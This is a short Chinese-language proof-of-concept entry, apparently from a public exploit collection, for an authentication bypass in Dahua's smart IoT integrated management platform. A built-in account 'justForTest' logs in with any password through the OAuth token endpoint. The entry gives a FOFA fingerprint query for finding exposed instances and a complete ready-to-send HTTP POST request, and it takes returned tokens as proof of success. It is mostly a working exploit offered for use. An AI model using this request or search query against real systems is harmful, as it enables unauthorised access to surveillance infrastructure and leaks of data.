## 大华智能物联综合管理平台justForTest用户登录漏洞
浙江大华技术股份有限公司智能物联综合管理平台 用户登录接口/evo-apigw/evo-oauth/oauth/token存在漏洞，使用用户justForTest/任意密码即可成功登录平台，造成信息泄露。

## fofa
```
icon_hash="-1935899595"body="*客户端会小于800*"
```

## poc
```
POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Content-Length: 109
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
 
username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```
出现各种token证明漏洞存在

![image](https://github.com/wy876/POC/assets/139549762/5f1c189e-2d92-4d73-a6c2-8593367c74bb)
